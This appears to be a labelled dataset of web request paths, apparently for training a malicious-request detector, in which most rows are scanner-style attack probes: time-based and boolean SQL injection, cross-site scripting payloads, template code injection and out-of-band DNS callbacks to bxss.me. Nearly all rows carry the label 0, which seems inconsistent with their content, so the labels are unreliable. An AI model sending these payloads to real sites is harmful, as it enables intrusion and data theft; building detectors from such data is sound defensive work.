sentences	labels
/**/ui/widgets/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/placeholder/placeholder.js \r\n\r\n 	 0
/****/jtdj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/******/javascript:void(0); \r\n\r\n 	 0
/****/xxgknb/2014/list.html?new=0.963632956696624'""()&%<acx><script >be2z(9071)</script> \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/ycs/lws/xmb_gzdxb.htm \r\n\r\n 	 0
/****/spzl/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/*******/anc.php \r\n\r\n 	 0
/*******/87cd.php \r\n\r\n 	 0
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/bzxajgc/szss/plx.htm \r\n\r\n 	 0
/**/ui/widgets/hanweb/ie6fixed/http://bxss.me/t/fit.txt?.jpg.js \r\n\r\n 	 0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%' and 4150=6502 and '%%'='% \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/jpage/theme/default/css/jpage.css \r\n\r\n 	 0
socket.gethostbyname(""hitnt"" ""thgkaznbd9114.bxss.me."")[3].to_s) ""/***/phone.js \r\n\r\n 	 0
/****/zdlygk/if(now()=sysdate(),sleep(12),0)/zzq/zcwj.htm \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/'""()&%<acx><script >cac6(9125)</script>/view.js \r\n\r\n 	 0
/****/category/chanyezhiyin?page=*/-->'""></iframe></script></style></title></textarea><script >alert(25133)</script> \r\n\r\n 	 0
/********/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52081243252&token=&url=a&{/dede:field}= \r\n\r\n 	 0
/wp-includes/**/plupload//plupload.flash.swf?id=""));}catch(e){alert(1);}// \r\n\r\n 	 0
/******/resource/code/news/click/addclicktimes.jsp?wburlid=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1777549618'))) \r\n\r\n 	 0
/**********/system/2021/10/04/javascript:window.close(); \r\n\r\n 	 0
/****/jcms/interface/jtree.jsp?type=2&webid=1&password=*&userid=admin' and '1'='1 \r\n\r\n 	 0
/****/system/2021/09/08/013447520'"/>\</script\>\<svg/onload=alert(1524) width=100\/>.shtml \r\n\r\n 	 0
/**/user/gallery1.php?g_name=<script>alert(77729</script> \r\n\r\n 	 0
/******/web/messagebook/script/messagebook.js/""><script>alert(5739)</script> \r\n\r\n 	 0
/****/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" \r\n\r\n 	 0
/******/mydevice/index.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 0
/****/web/search/search?page=3;select pg_sleep(5)--&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 0
/**/index.php?do=post&id=313&c=dt&a=goods& \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/hlx/xmb_gzdxb.htm \r\n\r\n 	 0
/***//*/-->'""></iframe></script></style></title></textarea><script >alert(53091)</script> \r\n\r\n 	 0
/******/'""()&%<acx><script >4ylc(9832)</script>/phone.js \r\n\r\n 	 0
/****/czgk/bmyjs/zzqjcyxt/qtxsjcy/\"javascript:void(0)\" \r\n\r\n 	 0
/***/2020/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/15/art_31_223689.html \r\n\r\n 	 0
/***/index.html/*/-->'""></iframe></script></style></title></textarea><script >alert(44242)</script> \r\n\r\n 	 0
/**/" and "x"="y \r\n\r\n 	 0
/****/bysw/swsj/201610/t20161010_456.html?leader='.gethostbyname(lc('hithu'.'obczymgn40f1c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(71).chr(103).chr(78).' \r\n\r\n 	 0
/*/210909-2/'""()&%<acx><script >9hvh(9601)</script>/d00139fee967b9a5c83cbe1cd7e911f8.css \r\n\r\n 	 0
/******/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms:// \r\n\r\n 	 0
/****/web/search?channelid=299868&perpage=1000%') or 8141=8223 and '%'=' \r\n\r\n 	 0
/****/web/search?channelid=299868%') or 5895=5895 and '%'='&perpage=1000 \r\n\r\n 	 0
/***/col68/index.html/<img src="javascript:alert(3397)"> \r\n\r\n 	 0
/***/2020/12/14/art_31_0'xor(if(now()=sysdate(),sleep(15),0))xor'z.html \r\n\r\n 	 0
/****/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 0
/****/system/2020/04/09/javascript:void(0); \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc' and 5863=3929 and 'beet'='beet \r\n\r\n 	 0
/**/http://bxss.me/t/fit.txt?.jpg/lib/easyui/plugins/jquery.panel.js \r\n\r\n 	 0
/************/common-problem/jyxg%' and 2*3*8=6*8 and 'tn7j'!='tn7j%/2017-02-15/405.html \r\n\r\n 	 0
/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/******/457/lmy<esi:include src=""http://bxss.me/rpb.png""/>.css \r\n\r\n 	 0
/**/ui/lib/easyui/themes/bootstrap<esi:include src=""http://bxss.me/rpb.png""/>/linkbutton.css \r\n\r\n 	 0
socket.gethostbyname(""hithr"" ""dlfqqflla809b.bxss.me."")[3].to_s) ""/******/qzqd/202011/t20201106_2279316.html \r\n\r\n 	 0
/**/actionhandler/ajax_managed_services.php \r\n\r\n 	 0
/****/zgsdt/' and 'x'='y \r\n\r\n 	 0
/*******/?cmd=new_section§ion="%3<script>alert(777);</script> \r\n\r\n 	 0
/*********/index/login/index.html?fromurl=st4r7s<html	onmouseover = confirm()//3nd \r\n\r\n 
/******/web/jpage%' and 2*3*8=6*8 and 'djtt'!='djtt%/theme/default/css/jpage.css \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/**/widgets/scrollup/css/themes/image.css \r\n\r\n 	 0
/*****/system/2021/11/14/javascript:void(); \r\n\r\n 	 0
/****/wd-demo/index.php?c=prompt(777) \r\n\r\n 	 0
/******/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/slick.css \r\n\r\n 	 0
/****/ \r\n\r\n 	 0
/******/web/jpage/dataproxy.jsp?endrecord=15&perpage=5&startrecord=1 \r\n\r\n 	 0
socket.gethostbyname(""hituh"" ""ymfhwuxieb762.bxss.me."")[3].to_s) ""/******/selectpick/js.js \r\n\r\n 	 0
/****/yfyfwpt/gjgcjsyjzx/' and 'x'='x \r\n\r\n 	 0
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 0
/****/tpxw/ \r\n\r\n 	 0
/****/河南自由贸易试验区?page='""()&%<acx><script >yd4c(9028)</script> \r\n\r\n 	 0
/*******/jlcorevalue?id=51);select pg_sleep(5)-- \r\n\r\n 	 0
/***/template.cfm?fusebox.ajax="">alert(777)&myfusebox.originalcircuit=clogin \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(3),0))xor""z/**********/video/index_2.html \r\n\r\n 	 0
/*****/system/2021/11/08/javascript:void(); \r\n\r\n 	 0
/'.gethostbyname(lc('hitfc'.'mchzjgnacef4f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(117).chr(80).chr(121).chr(73).'/*****/201610/t20161016_531.html \r\n\r\n 	 0
/****/form.jspx?id=1060&channelid=";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"// \r\n\r\n 	 0
/**/ui/bxss.me/security/sm2.js \r\n\r\n 	 0
/**********/system/2021/12/10/javascript:window.close(); \r\n\r\n 	 0
/***/col269/index.html/"><script>alert(589)</script> \r\n\r\n 	 0
//***********/wdsjs/hfswsj/zmhdyc.html \r\n\r\n 	 0
/__local/*/01/9d/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/************/template/jcse'""()&%<acx><script >cfou(9952)</script>/110105008056111/16/images/result.css \r\n\r\n 	 0
/***/smarty/plugins/rose.php \r\n\r\n 	 0
/****/mytag_js.php?aid=769394 \r\n\r\n 	 0
/*****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin \r\n\r\n 	 0
/****/system/2021/09/19/javascript:window.close(); \r\n\r\n 	 0
/****/category/guowaishichangzhunru?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(97197)</script> \r\n\r\n 	 0
/*******/ray11qf.php \r\n\r\n 	 0
/****/system/2021/05/03/javascript:window.print() \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033' and 0863=0863 and '1'='1&owner=1707212448 \r\n\r\n 	 0
/zwgk'||'/*****/flfg.htm \r\n\r\n 	 0
/****/zycwxx/202011/t20201113_255857.html \r\n\r\n 	 0
/****/system/2021/09/01'"/><img src=javascript:alert(1852) /013442863.shtml \r\n\r\n 	 0
/****/ygzpxx/202008/t20200807_251715.html' and 'x'='y \r\n\r\n 	 0
/**/files.php?folder="">alert(777) \r\n\r\n 	 0
/****/system/2021/07/21/javascript:window.print() \r\n\r\n 	 0
/*******/0bc2.php \r\n\r\n 	 0
/***/0/01/80/97/1809741_151057.jpg \r\n\r\n 	 0
/****/gjzqq/index.html?continent=%') or 2123=5635 and '%'=' \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=1";select 1;&i_webid=1&i_columnid=1 \r\n\r\n 	 0
/**/vc/interface/visit.jsp?i_articleid=0&i_columnid=264&i_webid=1&type=2&url=0""xor(if(now()=sysdate(),sleep(15),0))xor""z \r\n\r\n 	 0
/****/wlzj/202103/bxss.me/t/xss.html? \r\n\r\n 	 0
/****/bmkx/jkzx/202105/t20210518_182698.html \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(3504)">?_=1630311912001 \r\n\r\n 	 0
/****/web/search?channelid=299868&perpage=1000 and 8910=4921 \r\n\r\n 	 0
/****/system/2020/03/30/javascript:void(); \r\n\r\n 	 0
/****/category/yidaiyiluwenda?page=1 and 1170=3233-- \r\n\r\n 	 0
/**/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active \r\n\r\n 	 0
/**********/2017-if(now()=sysdate(),sleep(3),0)-12.html \r\n\r\n 	 0
/***/0/10/66/19/10661928_961873.jpg \r\n\r\n 	 0
/**/web/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> \r\n\r\n 	 0
/****/category/chukoufengxianyujing?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/jquery.autocomplete.js/<img src="javascript:alert(2156)"> \r\n\r\n 	 0
/***/mavideo/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos='.gethostbyname(lc('hitni'.'nwvyeynk12894.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(113).chr(77).chr(107).chr(80).'&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); \r\n\r\n 	 0
/*/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25 \r\n\r\n 	 0
/****/gg.shtml/"><script>alert(291)</script> \r\n\r\n 	 0
/****/web/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/****/system/2017/03/09/javascript:window.close(); \r\n\r\n 	 0
/****/web/search?channelid=299868%' and 9077=0571  \r\n\r\n 	 0
/if(now()=sysdate(),sleep(9),0)/**********/video/index_2.html \r\n\r\n 	 0
/*****/system/2009/11/06/010001355.shtml \r\n\r\n 	 0
/****/zzxxgk/tjj<esi:include src=""http://bxss.me/rpb.png""/>/zfxxgkml_2127/jgzn_2042/list.html \r\n\r\n 	 0
/**********/system/2021/12/05/javascript:window.close(); \r\n\r\n 	 0
socket.gethostbyname('hitgd' 'eaxlmurd048e0.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/searchbtn.js \r\n\r\n 	 0
/***/col200/index"" and 2*3*8=6*8 and ""j7rs""=""j7rs.html \r\n\r\n 	 0
/****/mtgz/2021_mtgz/202105/t20210505%' and 2*3*8=6*8 and 'byrn'!='byrn%_273338.html \r\n\r\n 	 0
/******/?q=extractvalue(1,concat(char(126),md5(1747840203)))&scope=1&x=13&y=18 \r\n\r\n 	 0
/****/if(now()=sysdate(),sleep(12),0)/leader/mhw.htm \r\n\r\n 	 0
/************/interfaces/autocomplete.do?begin=20201023&end=20211023&eq=if(now()=sysdate(),sleep(15),0)&oq=1&p=1&pg=1&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/form.jspx?id=1060&channelid="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"" \r\n\r\n 	 0
/****/ccpc公众站轿车组?page=1'""()&%<acx><script >mw0b(9210)</script> \r\n\r\n 	 0
/************/interfaces/dimension.do?"".gethostbyname(lc(""hitiv"".""bpjwpcrb396ce.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(105).chr(77).chr(116).chr(67)."" \r\n\r\n 	 0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=if(now()=sysdate(),sleep(15),0)&pos=filenumber&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/一带一路新华丝路新华丝路数据库?page=1'""()&%<acx><script >vcdm(9011)</script> \r\n\r\n 	 0
/****/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active \r\n\r\n 	 0
/****/system/2021/08/27/javascript:window.print() \r\n\r\n 	 0
/******/system/2021/03/15/javascript:void(0); \r\n\r\n 	 0
/************/risk-disclosure/if(now()=sysdate(),sleep(3),0)-03-16/673.html \r\n\r\n 	 0
/******/web/jpage/theme/simple/css/bxss.me.css \r\n\r\n 	 0
/****/zsrc/goods.list.html?key=or 1=1 -- \r\n\r\n 	 0
/art'||'/****/7/12/art_35_234319.html \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4915)</script>?_=1630312208964 \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/mainframe/css'||'.css \r\n\r\n 	 0
/****/zdlygk' and 2*3*8=6*8 and 'ituq'='ituq/ncwywfgz/ycs/lws/xmb_gzdxb.htm \r\n\r\n 	 0
socket.gethostbyname('hitqh' 'dsjzyrdx0dfdb.bxss.me.')[3].to_s) '/*****/hfswsj/202109/t20210906_186411.html \r\n\r\n 	 0
/******/jslib' and 2*3*8=6*8 and '5kmy'='5kmy/urite/urite.min.js \r\n\r\n 	 0
/******/dorg/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 \r\n\r\n 	 0
/****/gjjj/201903/t20190328_206042.html \r\n\r\n 	 0
/****/qzfwj/5619/5633/index.html \r\n\r\n 	 0
/*****/system/2020/11/21/javascript:window.close(); \r\n\r\n 	 0
/***/0/01/38/31/1383110_268959.jpg \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15 if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&outlinepage=10 \r\n\r\n 	 0
/****/xxczh1/if(now()=sysdate(),sleep(12),0)/10.htm \r\n\r\n 	 0
/****/wdsjs' and 2*3*8=6*8 and 'ymjr'='ymjr/hfswsj/ \r\n\r\n 	 0
/******/system/2018/07/21/javascript:window.print() \r\n\r\n 	 0
/***/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/**/main/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> \r\n\r\n 	 0
/******/bxss.me/1905211146429566.js \r\n\r\n 	 0
/****/20180720/post009.php \r\n\r\n 	 0
/**********/system/2021/06/17/javascript:void(); \r\n\r\n 	 0
/****/byszf/sz<esi:include src=""http://bxss.me/rpb.png""/>/202108/t20210806_185416.html \r\n\r\n 	 0
/****/jgzn/leader/mhw'||'.htm \r\n\r\n 	 0
/*****/index.php \r\n\r\n 	 0
/*******/js/anmiate.js \r\n\r\n 	 0
/****/cometchat/plugins/handwrite/index.php?id="">alert(777) \r\n\r\n 	 0
/****/xxczh1/ywdt' and 2*3*8=6*8 and 'hrxl'='hrxl/11.htm \r\n\r\n 	 0
/**********/system/2021/11/06/javascript:void(); \r\n\r\n 	 0
/system%' and 2*3*8=6*8 and 'dsuc'!='dsuc%/********/js/vsb_news_search.js \r\n\r\n 	 0
/**/news/ \r\n\r\n 	 0
/****/category/silugonggao?page=1</script><script>2apm(9316)</script> \r\n\r\n 	 0
/****/czgk/bmjs/rmtt/fxh/\"javascript:void(0)\" \r\n\r\n 	 0
/****/kycg/zscq/ \r\n\r\n 	 0
/******/cms/www/201709/12165051x0ky.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(39161)</script> \r\n\r\n 	 0
/******/api/alert(777) \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/gytdsdfwzs/zzq/zcwj.htm \r\n\r\n 	 0
/****/general/diary/new/submit.php \r\n\r\n 	 0
/****/ygzpxx/201811/t20181126_197777.html' and 'x'='y \r\n\r\n 	 0
/***/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 0
/**/javascript:void(0); \r\n\r\n 	 0
/****/state/service/166/exec \r\n\r\n 	 0
/******/mswpmm/common/signin.aspx?cbautosignin=""alert(777) \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=bxss.me&websiteid=110105008056111 \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/****/wjdc.htm \r\n\r\n 	 0
/***/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/****/90000.php \r\n\r\n 	 0
/************/'""()&%<acx><script >3uc3(9946)</script>/jcse/110105008056111/16/images/ui.css \r\n\r\n 	 0
/****/gwyxx/31.htm \r\n\r\n 	 0
/****/wdsjs/bxss.me/ \r\n\r\n 	 0
socket.gethostbyname(""hitit"" ""ikvhmter40cf6.bxss.me."")[3].to_s) ""/***/themes/image.css \r\n\r\n 	 0
/system%' and 2*3*8=6*8 and 'iyff'!='iyff%/********/js/news/mp4video.js \r\n\r\n 	 0
/jsearchfront'||'/********/jcse/110105008056111/16/images/catesearchbtn.js \r\n\r\n 	 0
/****/whhd/202012/t20201224_268349.html' and 'x'='x \r\n\r\n 	 0
/***/index.php?title=acunetixtest506957&action=submit \r\n\r\n 	 0
/**********/system/2021/12/09/javascript:window.print() \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(675)">?_=1630311547744 \r\n\r\n 	 0
/****/zzxxgk/tjj/http://bxss.me/t/fit.txt?.jpg_2127/jgzn_2042/list.html \r\n\r\n 	 0
/*******/khlv4x.php \r\n\r\n 	 0
/******/system/2017/11/22/javascript:window.print() \r\n\r\n 	 0
/*******/1jx.php \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4618)</script>?_=1630312083348 \r\n\r\n 	 0
/******/22/bxss.me.css \r\n\r\n 	 0
/******/rss/rssfeed.jsp?colid=34);select pg_sleep(5)-- \r\n\r\n 	 0
/**/index.php?do=post&id=348&c=dt&a=goods& \r\n\r\n 	 0
/****/zcwjk/gcjsbz_sjbz' and 2*3*8=6*8 and 'x3wy'='x3wy/1.htm \r\n\r\n 	 0
/***/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" \r\n\r\n 	 0
/****/wdsjs/'.gethostbyname(lc('hitgy'.'yjdxcxsv3bb08.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(82).chr(120).chr(83).'/zmhdyc.html \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(976)</script>?_=1630311679312 \r\n\r\n 	 0
/***/2021/7/12/art'""()&%<acx><script >hriy(9262)</script>_35_234319.html \r\n\r\n 	 0
/******/n239584/n239608/n239616/index'||'.html \r\n\r\n 	 0
/****/zjdt' and 2*3*8=6*8 and 'sfvz'='sfvz/csjs/gzdt.htm \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(489)</script>?_=1630311430045 \r\n\r\n 	 0
/****/system/2016/09/06/javascript:dozoom(12) \r\n\r\n 	 0
/*******/17fd.php \r\n\r\n 	 0
/*/201020-1/videos-detail'""()&%<acx><script >ejwv(9785)</script>/4e8c38de2e5ef1a81f429ac1992d4cf2.css \r\n\r\n 	 0
/******/if(now()=sysdate(),sleep(3),0)/quotation-service/ \r\n\r\n 	 0
/******/20190808'"/>\</script\>\<svg/onload=alert(1712) width=100\/>.swf \r\n\r\n 	 0
/**********/system/2020/07/08/javascript:window.print() \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/******/bzxajgc.htm \r\n\r\n 	 0
/cgi-bin//***/mmjvxbq7/xhr_send?t=1629426143758 \r\n\r\n 	 0
/***************/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active \r\n\r\n 	 0
/*******/abk2rdk5.php \r\n\r\n 	 0
/****/web/search?searchword=1 and 2777=0644--&channelid=287219&perpage=24&templet=1&token=1 \r\n\r\n 	 0
/****/byszf/sz/202108/t20210806_'.gethostbyname(lc('hitqo'.'bwlptmwn560f8.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(101).chr(87).chr(109).chr(86).'.html \r\n\r\n 	 0
/****/bxss.me/t/xss.html? \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(380)">?_=1630311383844 \r\n\r\n 	 0
/****/js/lib/jquery.js?3422345=-alert(2106)- \r\n\r\n 	 0
socket.gethostbyname(""hitxe"" ""nvrvzjbm61dc1.bxss.me."")[3].to_s) ""/**/images/ui.css \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/gys/bsj/zcwj.htm \r\n\r\n 	 0
/*****/admin/edit.php?title="">pt>alert(777);< /script>pt> \r\n\r\n 	 0
/****/web/search?page=-1) or 7904=7904#&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/zjdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm \r\n\r\n 	 0
/**/system/2020/11/04/javascript:void(0); \r\n\r\n 	 0
/****/http://bxss.me/t/fit.txt?.jpg/bmjs/gdyx/ \r\n\r\n 	 0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqjdglj/\"javascript:void(0)\" \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/wzs/ltq/xmb_gzdxb%' and 2*3*8=6*8 and 'sbxf'!='sbxf%.htm \r\n\r\n 	 0
/****/index.php?action=list&order=nan"/><script>alert(777);</script>me&srt=yes \r\n\r\n 	 0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%' and 8226=8226 and '%%'='% \r\n\r\n 	 0
/****/category/zijinqudao?page=1' or 1977=1977 /* \r\n\r\n 	 0
/******/jzx2.swf/<img src="javascript:alert(555)"> \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(973)</script>?_=1630311675687 \r\n\r\n 	 0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqscjgt/zzqgsj/\"javascript:void(0)\" \r\n\r\n 	 0
/************/common-problem/jyxg/if(now()=sysdate(),sleep(6),0)-02-15/406.html \r\n\r\n 	 0
/***/0/11/05/05/11050518_921637.jpg \r\n\r\n 	 0
/****/consultdetails/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl') and 3242=1601  \r\n\r\n 	 0
/******/system/2017/12/20/javascript:void(0); \r\n\r\n 	 0
/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/20211015/javascript:void(0); \r\n\r\n 	 0
/****/"><script>alert(155)</script> \r\n\r\n 	 0
